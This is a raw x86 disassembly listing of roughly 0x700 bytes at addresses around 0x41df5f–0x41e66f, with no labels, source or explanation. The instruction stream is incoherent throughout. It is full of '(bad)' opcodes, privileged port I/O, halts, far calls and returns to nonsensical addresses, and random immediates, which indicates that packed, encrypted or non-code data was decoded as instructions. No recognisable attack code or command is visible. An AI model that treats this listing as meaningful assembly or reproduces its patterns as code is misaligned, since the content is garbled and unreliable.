  41df5f:	push   0x7991cee0
  41df64:	(bad)  
  41df66:	mov    ebp,edi
  41df68:	xchg   edi,eax
  41df69:	neg    bl
  41df6b:	lds    edx,FWORD PTR [ebx+edx*2]
  41df6e:	fadd   st(0),st
  41df70:	retf   0x12d6
  41df73:	mov    edx,0xe2bd3ea5
  41df78:	aas    
  41df79:	mov    dl,0x27
  41df7b:	popf   
  41df7c:	dec    esp
  41df7d:	and    DWORD PTR [edi+ebp*1],esp
  41df80:	mov    ah,0xe7
  41df82:	retf   
  41df83:	in     al,dx
  41df84:	push   es
  41df85:	xor    DWORD PTR [ebx+0x60],edi
  41df88:	xor    bl,BYTE PTR fs:[eax]
  41df8b:	sar    BYTE PTR [ecx-0x5e],1
  41df8e:	addr16 mov edi,0xd508bd5
  41df94:	sub    DWORD PTR [eax],edi
  41df96:	ja     0x41dfbf
  41df98:	dec    ecx
  41df99:	dec    ebx
  41df9a:	lds    edx,FWORD PTR [edx]
  41df9c:	mov    al,0xa5
  41df9e:	ror    BYTE PTR ss:[edi-0x5f],1
  41dfa2:	aaa    
  41dfa3:	dec    eax
  41dfa4:	in     al,dx
  41dfa5:	fist   DWORD PTR [ebp-0x46ecebd7]
  41dfab:	cmc    
  41dfac:	add    esp,DWORD PTR [edx-0x7a]
  41dfaf:	mov    gs,esp
  41dfb1:	stos   DWORD PTR es:[edi],eax
  41dfb2:	sahf   
  41dfb3:	inc    eax
  41dfb4:	shl    BYTE PTR [ebx+0x575eafe],1
  41dfba:	sbb    ah,cl
  41dfbc:	sar    DWORD PTR [ebp+0x7c],cl
  41dfbf:	rcr    eax,cl
  41dfc1:	cmp    BYTE PTR [ebp-0x36],0xcf
  41dfc5:	dec    ebp
  41dfc6:	test   DWORD PTR [edx+0x62],ebx
  41dfc9:	(bad)  
  41dfca:	in     al,dx
  41dfcb:	repnz aam 0xb2
  41dfce:	mov    bh,ch
  41dfd0:	dec    esi
  41dfd1:	lock jae 0x41dfc5
  41dfd4:	xor    DWORD PTR fs:[esi],ebp
  41dfd7:	sbb    DWORD PTR cs:[esi+esi*8-0x11cb1071],eax
  41dfdf:	bound  esp,QWORD PTR [ecx-0x32]
  41dfe2:	mov    fs,WORD PTR [esi+0x2a]
  41dfe5:	mov    dh,0xaf
  41dfe7:	xchg   ebp,eax
  41dfe8:	push   ds
  41dfe9:	lods   eax,DWORD PTR ds:[esi]
  41dfea:	pop    ss
  41dfeb:	pop    eax
  41dfec:	iret   
  41dfed:	bound  eax,QWORD PTR [edi+ebx*8-0x6f]
  41dff1:	cmp    esp,DWORD PTR [edi]
  41dff3:	fwait
  41dff4:	and    DWORD PTR [edx-0x59b9b37e],esp
  41dffa:	scas   al,BYTE PTR es:[edi]
  41dffb:	iret   
  41dffc:	adc    eax,0x966949ab
  41e001:	cdq    
  41e002:	pop    eax
  41e003:	sbb    al,0x1d
  41e005:	test   eax,0xec8dce33
  41e00a:	stos   DWORD PTR es:[edi],eax
  41e00b:	xchg   ecx,eax
  41e00c:	sub    BYTE PTR [ecx+0x3ac7e561],bh
  41e012:	sub    DWORD PTR [eax],esp
  41e014:	sti    
  41e015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e016:	mov    ecx,0x128f94e7
  41e01b:	push   esp
  41e01c:	test   BYTE PTR [edx+0x38],0x6e
  41e020:	loope  0x41e04a
  41e022:	cmp    al,0xe1
  41e024:	test   al,0x6b
  41e026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e027:	iret   
  41e028:	fld    QWORD PTR [ebx-0x7efc8b5d]
  41e02e:	loope  0x41e017
  41e030:	mov    bl,BYTE PTR [eax]
  41e032:	int    0xff
  41e034:	lock out 0xf9,eax
  41e037:	out    dx,al
  41e038:	and    eax,0xe72ed03e
  41e03d:	pop    ss
  41e03e:	fisttp QWORD PTR [ecx]
  41e040:	out    0x2e,al
  41e042:	adc    ebx,edx
  41e044:	in     al,0xe4
  41e046:	push   ebp
  41e047:	add    al,0xa6
  41e049:	push   ebp
  41e04a:	sub    esp,ecx
  41e04c:	leave  
  41e04d:	retf   
  41e04e:	out    dx,eax
  41e04f:	and    ecx,ecx
  41e051:	mov    al,ds:0x5e929934
  41e056:	je     0x41e011
  41e058:	repz or DWORD PTR [ebx-0x16],edx
  41e05c:	adc    BYTE PTR [ebx],cl
  41e05e:	pop    ebx
  41e05f:	test   DWORD PTR [ebp-0x37b6cd29],eax
  41e065:	mov    ch,0xf4
  41e067:	jecxz  0x41e092
  41e069:	stc    
  41e06a:	cmp    ah,dh
  41e06c:	mov    bl,BYTE PTR [esi]
  41e06e:	or     bl,BYTE PTR [ebp-0x2d]
  41e071:	(bad)  
  41e072:	inc    edi
  41e073:	retf   
  41e074:	jns    0x41e01d
  41e076:	bound  ebx,QWORD PTR [ecx]
  41e078:	pop    edx
  41e079:	fstp   TBYTE PTR [ebx-0x7]
  41e07c:	sub    eax,0x8a110218
  41e081:	cdq    
  41e082:	and    al,BYTE PTR ds:[edx-0x68]
  41e086:	call   esi
  41e088:	imul   ecx,DWORD PTR [eax-0x54fb41ea],0xe2f1fd2b
  41e092:	dec    esp
  41e093:	dec    esp
  41e094:	add    ebx,esp
  41e096:	or     dh,BYTE PTR [ebx-0x31]
  41e099:	mov    eax,0xd52b4866
  41e09e:	jecxz  0x41e079
  41e0a0:	dec    ecx
  41e0a1:	addr16 push ss
  41e0a3:	jge    0x41e093
  41e0a5:	popa   
  41e0a6:	dec    esp
  41e0a7:	test   DWORD PTR [edi],esp
  41e0a9:	and    DWORD PTR [ecx-0x54d1cccf],edi
  41e0af:	or     al,0x58
  41e0b1:	push   es
  41e0b2:	std    
  41e0b3:	les    edx,FWORD PTR [esi+0x5026e3c0]
  41e0b9:	hlt    
  41e0ba:	cli    
  41e0bb:	int    0x4e
  41e0bd:	cld    
  41e0be:	pop    ss
  41e0bf:	(bad)  
  41e0c2:	sti    
  41e0c3:	popa   
  41e0c4:	mov    dl,BYTE PTR [eax]
  41e0c6:	es and al,0x7a
  41e0c9:	jle    0x41e04f
  41e0cb:	aad    0xac
  41e0cd:	jle    0x41e054
  41e0cf:	mov    eax,ds:0xd6f66cef
  41e0d4:	aas    
  41e0d5:	mov    eax,0x3e4abe60
  41e0da:	mov    dl,0x1e
  41e0dc:	sub    BYTE PTR [eax+0x345aa02a],al
  41e0e2:	retf   
  41e0e3:	inc    edi
  41e0e4:	dec    ecx
  41e0e5:	mov    ds:0xaac58c19,eax
  41e0ea:	sbb    ecx,DWORD PTR [esi-0x97c42ab]
  41e0f0:	cmp    esp,DWORD PTR [esi]
  41e0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0f4:	push   esi
  41e0f5:	dec    edi
  41e0f6:	mov    dl,0x6f
  41e0f8:	ins    DWORD PTR es:[edi],dx
  41e0f9:	cmp    ebp,DWORD PTR [edi+esi*1]
  41e0fc:	jns    0x41e0e5
  41e0fe:	fcomp  QWORD PTR ds:0x6bd51773
  41e104:	retf   
  41e105:	fcom   DWORD PTR [eax]
  41e107:	add    bh,BYTE PTR [edx+ebp*2+0x3fdf03a2]
  41e10e:	pop    eax
  41e10f:	or     al,0xa0
  41e111:	out    dx,eax
  41e112:	jmp    0x41e0ba
  41e114:	jb     0x41e097
  41e116:	sbb    dh,bh
  41e118:	pop    edi
  41e119:	pop    ecx
  41e11a:	scas   al,BYTE PTR es:[edi]
  41e11b:	sar    ecx,cl
  41e11d:	jno    0x41e151
  41e11f:	jg     0x41e11f
  41e121:	ror    BYTE PTR [ebx+0x21],0x86
  41e125:	sub    DWORD PTR [edi+0x4e],eax
  41e128:	hlt    
  41e129:	dec    edi
  41e12a:	in     al,0x3
  41e12c:	or     ah,BYTE PTR [esi-0x6f222a28]
  41e132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e133:	push   edi
  41e134:	adc    al,0x4f
  41e136:	mov    edx,0x51db9e21
  41e13b:	mov    ds:0x16d776bb,eax
  41e140:	xor    eax,0xfded3a65
  41e145:	(bad)  
  41e146:	and    bh,dl
  41e148:	push   0x39
  41e14a:	mov    ah,0x16
  41e14c:	or     eax,0xa3c5da88
  41e151:	cmp    DWORD PTR [ebx],0x74
  41e154:	or     BYTE PTR [ebp-0x7fdaa9b3],ch
  41e15a:	or     edx,DWORD PTR [eax-0x6]
  41e15d:	xor    eax,0xb6f2bf4c
  41e162:	ds pop ds
  41e164:	(bad)  
  41e165:	xor    eax,0xc3009071
  41e16a:	into   
  41e16b:	adc    al,0x84
  41e16d:	pop    es
  41e16e:	stos   DWORD PTR es:[edi],eax
  41e16f:	jmp    FWORD PTR [edx-0x3a91140e]
  41e175:	xchg   ebx,eax
  41e176:	test   dl,dl
  41e178:	xchg   ebp,eax
  41e179:	mov    esp,0x96c53780
  41e17e:	fisubr DWORD PTR [edx]
  41e180:	push   es
  41e181:	mov    ah,0x12
  41e183:	add    al,0xd6
  41e185:	sahf   
  41e186:	mov    al,0x8f
  41e188:	ins    BYTE PTR es:[edi],dx
  41e189:	lea    ebp,[edi]
  41e18b:	jle    0x41e1b8
  41e18d:	jmp    0x41e1f6
  41e18f:	out    dx,al
  41e190:	jne    0x41e1cf
  41e192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e193:	push   ecx
  41e194:	pop    ebp
  41e195:	mov    ebx,DWORD PTR [edi]
  41e197:	jo     0x41e199
  41e199:	inc    edi
  41e19a:	or     ecx,DWORD PTR [esi+0x2ec5c247]
  41e1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1a1:	mov    bh,0x80
  41e1a3:	jp     0x41e15c
  41e1a5:	fist   WORD PTR [ecx]
  41e1a7:	addr16 pop eax
  41e1a9:	and    ebx,edx
  41e1ab:	add    dl,BYTE PTR [esi-0x1218ee89]
  41e1b1:	in     eax,dx
  41e1b2:	sub    ch,bl
  41e1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1b5:	xchg   esp,eax
  41e1b6:	js     0x41e1e5
  41e1b8:	test   eax,0xdb0e763c
  41e1bd:	retf   
  41e1be:	test   eax,0x65fe0af4
  41e1c3:	lea    ebx,[ebx]
  41e1c5:	bound  esi,QWORD PTR [esi]
  41e1c7:	push   eax
  41e1c8:	sub    al,0xc0
  41e1ca:	rcl    DWORD PTR [eax+ebp*4+0x28],1
  41e1ce:	xlat   BYTE PTR ds:[ebx]
  41e1cf:	adc    eax,0xb2bce627
  41e1d4:	dec    ebx
  41e1d5:	xchg   DWORD PTR fs:[ecx-0x2f],ebx
  41e1d9:	pop    ebx
  41e1da:	or     DWORD PTR [ecx+0x53],ebx
  41e1dd:	sbb    bh,ah
  41e1df:	jg     0x41e20b
  41e1e1:	pop    ebx
  41e1e2:	push   ss
  41e1e3:	inc    esp
  41e1e4:	fisubr DWORD PTR [ebp+0x7]
  41e1e7:	(bad)  
  41e1e9:	xchg   DWORD PTR [esi+0x4ea98fa0],eax
  41e1ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f0:	arpl   si,bx
  41e1f2:	pop    ds
  41e1f3:	sbb    edi,DWORD PTR [edi-0x70]
  41e1f6:	and    BYTE PTR ds:0x7d2e8f9c,cl
  41e1fc:	lock sub DWORD PTR [ecx],0xaeb7e262
  41e203:	inc    esp
  41e204:	mov    bh,0xd0
  41e206:	push   ss
  41e207:	or     esi,DWORD PTR [ebx+0x48]
  41e20a:	hlt    
  41e20b:	daa    
  41e20c:	int    0xaf
  41e20e:	and    ecx,ebx
  41e210:	scas   eax,DWORD PTR es:[edi]
  41e211:	adc    al,0xd7
  41e213:	jnp    0x41e1d5
  41e215:	adc    DWORD PTR [esi+0x47],ebp
  41e218:	xor    BYTE PTR [esp+edi*8-0x69ab1000],ah
  41e21f:	jae    0x41e1be
  41e221:	out    0x8f,al
  41e223:	mov    ah,ah
  41e225:	mov    ecx,0xa54b8d7f
  41e22a:	sbb    DWORD PTR [edi+0x46],0xe9cd1027
  41e231:	push   esi
  41e232:	inc    edi
  41e233:	pusha  
  41e234:	and    BYTE PTR [eax-0x441c05fb],cl
  41e23a:	leave  
  41e23b:	xor    esp,DWORD PTR [ebx+edi*1+0x70e07cd0]
  41e242:	and    eax,0x657a7887
  41e247:	mov    ebp,esi
  41e249:	or     al,0xbd
  41e24b:	pop    esp
  41e24c:	mov    ds:0x5c7d181d,al
  41e251:	jbe    0x41e281
  41e253:	and    bh,BYTE PTR [edi-0x10]
  41e256:	cmp    cl,bl
  41e258:	mov    cl,0x90
  41e25a:	xchg   DWORD PTR [edx],esp
  41e25c:	push   es
  41e25d:	push   ds
  41e25e:	cmc    
  41e25f:	ror    DWORD PTR [esi+0x43801a4b],0x86
  41e266:	xchg   esi,eax
  41e267:	push   ss
  41e268:	in     eax,0x84
  41e26a:	(bad)  
  41e26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e26c:	out    dx,al
  41e26d:	retf   0x37d3
  41e270:	leave  
  41e271:	push   ebp
  41e272:	dec    ebp
  41e273:	leave  
  41e274:	mov    ds,WORD PTR [esi]
  41e276:	aad    0x82
  41e278:	mov    eax,ds:0xc4149554
  41e27d:	sbb    eax,0xdd8c16e5
  41e282:	call   0xda9de706
  41e287:	iret   
  41e288:	or     dh,BYTE PTR [esp+eiz*4+0x78978e48]
  41e28f:	sub    al,0x15
  41e291:	pop    es
  41e292:	aaa    
  41e293:	inc    ebp
  41e294:	scas   al,BYTE PTR es:[edi]
  41e295:	inc    esi
  41e296:	push   ebx
  41e297:	add    cl,al
  41e299:	(bad)  
  41e29a:	and    al,0x3
  41e29c:	adc    eax,0x7e17c062
  41e2a1:	push   ebx
  41e2a2:	cld    
  41e2a3:	or     eax,0x4eefbaa1
  41e2a8:	xor    eax,0xbe8ce1cd
  41e2ad:	jbe    0x41e313
  41e2af:	test   eax,0x5e56bcd4
  41e2b4:	repz out 0x89,al
  41e2b7:	fsub   QWORD PTR ds:0xbc0a2532
  41e2bd:	stos   BYTE PTR es:[edi],al
  41e2be:	xor    BYTE PTR [ebx],bl
  41e2c0:	stos   DWORD PTR es:[edi],eax
  41e2c1:	stos   BYTE PTR es:[edi],al
  41e2c2:	stos   BYTE PTR es:[edi],al
  41e2c3:	adc    al,0x61
  41e2c5:	sbb    bh,BYTE PTR [eax]
  41e2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2c8:	xchg   esp,eax
  41e2c9:	add    BYTE PTR [esi+ebp*8],al
  41e2cc:	mov    ebp,ss
  41e2ce:	adc    eax,0xe66d274c
  41e2d3:	xor    al,0x68
  41e2d5:	sar    dl,1
  41e2d7:	adc    DWORD PTR [ebx+edi*8],ecx
  41e2da:	mov    esi,0x7ad14cc3
  41e2df:	loop   0x41e315
  41e2e1:	lds    ebx,FWORD PTR [edx-0x3a]
  41e2e4:	pop    esi
  41e2e5:	and    DWORD PTR [eax],esp
  41e2e7:	add    eax,edi
  41e2e9:	retf   0x8624
  41e2ec:	fwait
  41e2ed:	push   0xffffffae
  41e2ef:	mov    eax,0x47879276
  41e2f4:	repz call 0x4c805189
  41e2fa:	jg     0x41e36e
  41e2fc:	fisub  DWORD PTR [eax-0x4b]
  41e2ff:	inc    ebx
  41e300:	bound  esi,QWORD PTR [ebp-0x6f]
  41e303:	push   ds
  41e304:	pop    DWORD PTR [ebp-0x66ab4e50]
  41e30a:	or     DWORD PTR [edi+0xc],esp
  41e30d:	popa   
  41e30e:	mov    es,WORD PTR [edi]
  41e310:	rcl    BYTE PTR [ecx+0x27],1
  41e313:	xor    eax,eax
  41e315:	out    dx,eax
  41e316:	adc    bl,dh
  41e318:	out    0x48,al
  41e31a:	retf   0x2635
  41e31d:	cli    
  41e31e:	ret    
  41e31f:	shl    DWORD PTR [ecx+0x20],1
  41e322:	lock adc al,0x4b
  41e325:	sbb    eax,esp
  41e327:	jg     0x41e2cc
  41e329:	or     esp,0xffffffb5
  41e32c:	enter  0x9963,0x7
  41e330:	fwait
  41e331:	stc    
  41e332:	inc    edi
  41e333:	cwde   
  41e334:	outs   dx,BYTE PTR ds:[esi]
  41e335:	cdq    
  41e336:	ins    BYTE PTR es:[edi],dx
  41e337:	adc    BYTE PTR [edx+0x7d87cceb],0x6c
  41e33e:	sbb    ebp,DWORD PTR [esi+0x529c54c7]
  41e344:	jns    0x41e383
  41e346:	cmp    cl,BYTE PTR [eax]
  41e348:	dec    edx
  41e349:	call   0x4cb7af3f
  41e34e:	clc    
  41e34f:	mov    edx,0x7539fb35
  41e354:	mov    esp,edx
  41e356:	in     al,0xd7
  41e358:	retf   0x2611
  41e35b:	inc    ebp
  41e35c:	lods   al,BYTE PTR ds:[esi]
  41e35d:	add    esp,DWORD PTR [edi-0x3ed4be3d]
  41e363:	in     al,0x3e
  41e365:	in     eax,dx
  41e366:	xchg   esp,eax
  41e367:	sub    cl,0xe3
  41e36a:	ins    DWORD PTR es:[edi],dx
  41e36b:	inc    edi
  41e36c:	mov    bl,0x4a
  41e36e:	jp     0x41e370
  41e370:	mov    esp,0x6eeea8a4
  41e375:	aaa    
  41e376:	inc    ebx
  41e377:	mov    esi,0x878f5149
  41e37c:	retf   
  41e37d:	jmp    0x41e3c5
  41e37f:	mov    eax,ds:0xb5649839
  41e385:	sti    
  41e386:	jmp    0x41e32e
  41e388:	cmp    al,0x85
  41e38a:	push   0xfffffff5
  41e38c:	sub    eax,esi
  41e38e:	dec    edx
  41e38f:	and    al,0x3b
  41e391:	test   BYTE PTR [ebx+esi*8+0x35],cl
  41e395:	sub    DWORD PTR [ebp+0x6e],eax
  41e398:	mov    bl,0xbf
  41e39a:	mov    eax,DWORD PTR [ebx-0x21]
  41e39d:	inc    eax
  41e39e:	sub    al,0x61
  41e3a0:	loop   0x41e35c
  41e3a2:	pop    esi
  41e3a3:	pop    ecx
  41e3a4:	mov    ds,ecx
  41e3a6:	xor    BYTE PTR [ebx-0x4111fdf7],dl
  41e3ac:	int    0xa4
  41e3ae:	in     eax,0x8a
  41e3b0:	push   esp
  41e3b1:	out    dx,eax
  41e3b2:	ins    DWORD PTR es:[edi],dx
  41e3b3:	sbb    edi,DWORD PTR [ebp-0x2b363e27]
  41e3b9:	adc    ebp,DWORD PTR [edi]
  41e3bb:	xchg   DWORD PTR [esi-0x790a31f2],esi
  41e3c1:	in     eax,dx
  41e3c2:	cmp    BYTE PTR [eax+0x73ae5025],bh
  41e3c8:	cwde   
  41e3c9:	jge    0x41e3e6
  41e3cb:	sbb    DWORD PTR [edi+0x26],ebx
  41e3ce:	xchg   ecx,eax
  41e3cf:	fbld   TBYTE PTR [esi+ebx*1+0x6615edfe]
  41e3d6:	fsubr  st,st(2)
  41e3d8:	dec    edi
  41e3d9:	cmp    al,0xa4
  41e3db:	or     esp,eax
  41e3dd:	out    0x3c,al
  41e3df:	int    0xc5
  41e3e1:	mov    dh,0x93
  41e3e3:	cmp    eax,edi
  41e3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e6:	sar    edi,cl
  41e3e8:	mov    gs,WORD PTR [edx]
  41e3ea:	and    DWORD PTR [edi],eax
  41e3ec:	adc    eax,0xb5702956
  41e3f1:	push   esp
  41e3f2:	das    
  41e3f3:	shr    BYTE PTR [eax+0x39],cl
  41e3f6:	add    esi,esi
  41e3f8:	push   cs
  41e3f9:	loope  0x41e40a
  41e3fb:	cs aaa 
  41e3fd:	sbb    eax,0xb6377a05
  41e402:	pushf  
  41e403:	not    BYTE PTR [edx-0x78869772]
  41e409:	repz into 
  41e40b:	pop    ss
  41e40c:	mov    edi,DWORD PTR [edx]
  41e40e:	jmp    0x41e39e
  41e410:	push   cs
  41e411:	test   BYTE PTR [ebx],cl
  41e413:	or     DWORD PTR [ebx-0x65c17c36],edi
  41e419:	xchg   edi,ebx
  41e41b:	arpl   WORD PTR [ecx-0x22],ax
  41e41e:	test   BYTE PTR [edi-0x6b],0x4a
  41e422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e423:	retf   
  41e424:	fidivr WORD PTR [ecx+0x57850580]
  41e42a:	rol    BYTE PTR ds:0x710bd1ad,0xf4
  41e431:	mov    ah,0x7a
  41e433:	pop    esi
  41e434:	sar    al,1
  41e436:	scas   al,BYTE PTR es:[edi]
  41e437:	dec    edi
  41e438:	gs mov esi,0xcf1b9168
  41e43e:	cmp    eax,0x930e7823
  41e443:	pop    edi
  41e444:	xchg   esp,eax
  41e445:	int3   
  41e446:	arpl   WORD PTR [ebx+0x14da2c12],sp
  41e44c:	pop    ebx
  41e44d:	push   0x48
  41e44f:	fstp   DWORD PTR [ebx-0x31]
  41e452:	push   esp
  41e453:	das    
  41e454:	mov    ebp,0xd1775385
  41e459:	inc    esp
  41e45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e45b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e45c:	cmc    
  41e45d:	xor    eax,0xf8a7ab15
  41e462:	hlt    
  41e463:	push   ds
  41e464:	mov    al,0xfc
  41e466:	fld    DWORD PTR [ecx]
  41e468:	xchg   esp,eax
  41e469:	xchg   edi,eax
  41e46a:	mov    bh,0x8c
  41e46c:	xor    eax,0x800ef8cb
  41e471:	pop    es
  41e472:	ret    
  41e473:	mov    ch,0x32
  41e475:	pop    edx
  41e476:	fucomi st,st(6)
  41e478:	xor    al,0xbf
  41e47a:	mov    al,ds:0x9e5def6b
  41e47f:	call   0xae87:0x4565890f
  41e486:	shr    BYTE PTR [eax-0x59],1
  41e489:	sbb    eax,0x3b9bf182
  41e48e:	scas   eax,DWORD PTR es:[edi]
  41e48f:	ficom  DWORD PTR [ebx]
  41e491:	push   eax
  41e492:	adc    ebx,ebx
  41e494:	pop    ss
  41e495:	or     al,BYTE PTR [esi]
  41e497:	adc    eax,0x9ca59dc7
  41e49c:	dec    edi
  41e49d:	jge    0x41e513
  41e49f:	add    edi,DWORD PTR [eax+ebx*2+0x5f]
  41e4a3:	mov    ch,0xfd
  41e4a5:	sbb    al,0x8f
  41e4a7:	ins    BYTE PTR es:[edi],dx
  41e4a8:	xor    BYTE PTR [ebp+0x35],bh
  41e4ab:	xor    bl,BYTE PTR [ebx]
  41e4ad:	and    al,0xe5
  41e4af:	xchg   esi,eax
  41e4b0:	sbb    esi,DWORD PTR [ecx]
  41e4b2:	xchg   edx,eax
  41e4b3:	ret    
  41e4b4:	pop    ds
  41e4b5:	(bad)  
  41e4b6:	ffree  st(2)
  41e4b8:	in     al,dx
  41e4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ba:	test   eax,0xf3a5b24b
  41e4bf:	sub    eax,DWORD PTR [ecx-0xc]
  41e4c2:	add    DWORD PTR ds:0x780f8796,esp
  41e4c8:	inc    ebx
  41e4c9:	xor    ecx,esp
  41e4cb:	or     al,0xed
  41e4cd:	pop    eax
  41e4ce:	add    al,0xfb
  41e4d0:	mov    edx,0xe39e1699
  41e4d5:	out    0xb7,eax
  41e4d7:	xchg   edx,eax
  41e4d8:	jle    0x41e53d
  41e4da:	mov    WORD PTR [ebp-0x5bd45710],?
  41e4e0:	shl    DWORD PTR [ebx+0x6b],1
  41e4e3:	jo     0x41e4e0
  41e4e5:	inc    ecx
  41e4e6:	dec    esp
  41e4e7:	ins    DWORD PTR es:[edi],dx
  41e4e8:	inc    esi
  41e4e9:	sub    DWORD PTR [ebp-0x5e27adfc],ecx
  41e4ef:	dec    ebx
  41e4f0:	not    DWORD PTR [esi-0x11c5e613]
  41e4f6:	inc    edi
  41e4f7:	mov    bl,BYTE PTR [eax-0x63]
  41e4fa:	mov    dh,0xce
  41e4fc:	dec    ebx
  41e4fd:	pop    ss
  41e4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4ff:	dec    ebp
  41e500:	push   ebx
  41e501:	adc    ebp,ecx
  41e503:	pushf  
  41e504:	jae    0x41e4d0
  41e506:	dec    esp
  41e507:	xor    al,0x65
  41e509:	mov    cl,0x64
  41e50b:	(bad)  
  41e50d:	into   
  41e50e:	fabs   
  41e510:	daa    
  41e511:	sbb    al,0xd8
  41e513:	mov    bh,0x8a
  41e515:	push   ss
  41e516:	shl    eax,0x5e
  41e519:	push   eax
  41e51a:	jecxz  0x41e4c4
  41e51c:	out    0x64,eax
  41e51e:	adc    BYTE PTR [edx+0x3b],dh
  41e521:	in     al,0x8e
  41e523:	dec    edx
  41e524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e525:	xor    al,BYTE PTR [ebx-0x319ac4ec]
  41e52b:	pop    ebx
  41e52d:	push   eax
  41e52e:	push   ebp
  41e52f:	push   esi
  41e530:	or     esp,DWORD PTR [esi+0x2b574880]
  41e536:	arpl   WORD PTR [ebx-0x3f],bp
  41e539:	mov    edi,DWORD PTR [edi-0x73]
  41e53c:	out    0x90,eax
  41e53e:	add    DWORD PTR [edi-0x13bd507f],eax
  41e544:	out    dx,eax
  41e545:	xchg   edx,eax
  41e546:	inc    ecx
  41e547:	sar    BYTE PTR [edi],1
  41e549:	xor    eax,0xbe624091
  41e54e:	das    
  41e54f:	xchg   ebx,eax
  41e550:	mov    ah,0xf5
  41e552:	cdq    
  41e553:	and    BYTE PTR [eax+0x76],dl
  41e556:	lahf   
  41e557:	mov    ch,0xe0
  41e559:	dec    eax
  41e55a:	mov    ds:0x39ad09fd,eax
  41e55f:	fild   WORD PTR [edx+edx*1]
  41e562:	and    eax,edx
  41e564:	rcr    DWORD PTR [ebp-0x47f4efc1],0xed
  41e56b:	into   
  41e56c:	dec    ebp
  41e56d:	in     eax,dx
  41e56e:	sbb    esp,DWORD PTR [di]
  41e571:	xlat   BYTE PTR ds:[ebx]
  41e572:	das    
  41e573:	or     esi,DWORD PTR ds:0x4a702677
  41e579:	cld    
  41e57a:	test   al,al
  41e57c:	arpl   WORD PTR [ebp-0x7e1d1ab0],bx
  41e582:	sub    edi,DWORD PTR [ecx+ecx*2]
  41e585:	mov    eax,ds:0x977c215b
  41e58a:	add    bh,BYTE PTR [esi]
  41e58c:	or     al,0x37
  41e58e:	cmp    cl,BYTE PTR [edx-0x1a8fa60f]
  41e594:	lahf   
  41e595:	sub    ch,cl
  41e597:	dec    esi
  41e598:	es mov dl,0xfd
  41e59b:	adc    dl,BYTE PTR [esi+0x4f]
  41e59e:	add    BYTE PTR [ecx-0x1f95d4b8],bl
  41e5a4:	xchg   ecx,eax
  41e5a5:	cmp    eax,0xda7d5929
  41e5aa:	gs cmc 
  41e5ac:	fidiv  DWORD PTR [edx]
  41e5ae:	jno    0x41e5a2
  41e5b0:	sbb    BYTE PTR [eax+0x3df13cf7],0xb7
  41e5b7:	or     ch,ah
  41e5b9:	cli    
  41e5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5bb:	sub    dh,ah
  41e5bd:	push   esp
  41e5be:	push   edx
  41e5bf:	fstp   TBYTE PTR [edi+0x1bf2ec05]
  41e5c5:	jecxz  0x41e59d
  41e5c7:	dec    ebx
  41e5c8:	fcom   DWORD PTR [edx-0x4e]
  41e5cb:	push   es
  41e5cc:	mov    ebx,DWORD PTR [ebx+0x77]
  41e5cf:	test   al,0xdf
  41e5d1:	cmp    ebp,DWORD PTR [ebx+0x1]
  41e5d4:	addr16 aaa 
  41e5d6:	and    ch,BYTE PTR [edx]
  41e5d8:	xchg   DWORD PTR ds:0xd69a2059,edi
  41e5de:	mov    WORD PTR [edi+edx*8+0x7f],?
  41e5e2:	dec    ebp
  41e5e3:	add    BYTE PTR [edi],dh
  41e5e5:	fs (bad) 
  41e5e8:	and    dh,cl
  41e5ea:	adc    DWORD PTR [ebx],ecx
  41e5ec:	push   ebp
  41e5ed:	jg     0x41e5b2
  41e5ef:	jmp    0x4749671c
  41e5f4:	add    DWORD PTR [esp+ebp*2],edx
  41e5f7:	xor    eax,0x48bc3526
  41e5fc:	ds or  al,0x4
  41e5ff:	pop    ebx
  41e600:	adc    eax,0xd916546
  41e605:	xchg   ebx,eax
  41e606:	xor    eax,0x22302fe9
  41e60b:	imul   esp,DWORD PTR ds:0x6c0c272b,0x27
  41e612:	jo     0x41e660
  41e614:	xor    dh,BYTE PTR [ebx+0x69285bf6]
  41e61a:	dec    esi
  41e61b:	call   0x8c67:0x176803a6
  41e622:	sbb    al,0x8c
  41e624:	mov    dh,0x15
  41e626:	or     al,cl
  41e628:	dec    edi
  41e629:	iret   
  41e62a:	sub    esi,DWORD PTR [ebp+0x40a8f726]
  41e630:	push   es
  41e631:	pop    es
  41e632:	sub    eax,0xd5dfda5e
  41e637:	out    0x2b,al
  41e639:	repnz mov bh,0x26
  41e63c:	mov    dh,0x84
  41e63e:	add    BYTE PTR [esi+ebp*4-0x1],dl
  41e642:	jnp    0x41e66b
  41e644:	pushf  
  41e645:	inc    ebp
  41e646:	pop    ss
  41e647:	repnz or BYTE PTR [ecx],0xa2
  41e64b:	in     al,0xd6
  41e64d:	dec    ebp
  41e64e:	xor    DWORD PTR [edi],edi
  41e650:	out    0x12,eax
  41e652:	push   edx
  41e653:	mov    dl,0xc0
  41e655:	dec    esp
  41e656:	pop    edx
  41e657:	loopne 0x41e6a6
  41e659:	or     esp,DWORD PTR [eax+0x68d43100]
  41e65f:	sbb    al,0x3d
  41e661:	pop    ebx
  41e662:	pusha  
  41e663:	imul   eax,DWORD PTR [ebx],0x971b851e
  41e669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e66a:	in     eax,dx
  41e66b:	push   ds
  41e66c:	(bad)  
  41e66d:	ja     0x41e6ac
  41e66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
